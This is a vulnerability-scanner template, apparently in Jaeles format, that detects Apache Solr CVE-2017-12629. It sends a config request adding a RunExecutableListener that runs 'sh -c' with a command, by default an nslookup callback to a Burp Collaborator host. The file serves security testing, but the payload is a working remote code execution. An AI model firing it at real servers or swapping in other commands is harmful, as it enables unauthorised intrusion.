id: apache-solr-rce-cve-2017-12629
info:
  name: Apache Solr RCE  CVE-2017-12629
  risk: Critical

params:
  - root: "{{.BaseURL}}"
  - cmd: "nslookup 2begkyjvkjzufiscrrqcmu4rlirff4.burpcollaborator.net"

requests:
  - method: POST
    redirect: false
    url: >-
      {{.root}}/solr/demo/config
    headers:
      - User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
      - Content-Type: application/json
    body: |
      {"add-listener":{"event":"postCommit","name":"newlistener","class":"solr.RunExecutableListener","exe":"sh","dir":"/bin/","args":["-c", "{{.cmd}}"]}}
    detections:
      - >-
        StatusCode() == 200 && StringSearch("body", "responseHeader") && StringSearch("body", "format is experimental")
      - >-
        StatusCode() == 200 && StringSearch("body", "newlistener' already exists") && StringSearch("body", "format is experimental")

  # Trigger Command
  # - method: POST
  #   url: >-
  #     {{.root}}/solr/demo/update
  #   headers:
  #     - User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3984.0 Safari/537.36
  #     - Content-Type: application/json
  #   body: |
  #     [{"id":"test"}]
  #   detections:
  #     - >-
  #       StatusCode() == 200 && StringSearch("body", "responseHeader") && StringSearch("body", "QTime")

references:
  - links:
      - https://www.exploit-db.com/exploits/43009
      - https://github.com/vulhub/vulhub/blob/master/solr/CVE-2017-12629-RCE/README.md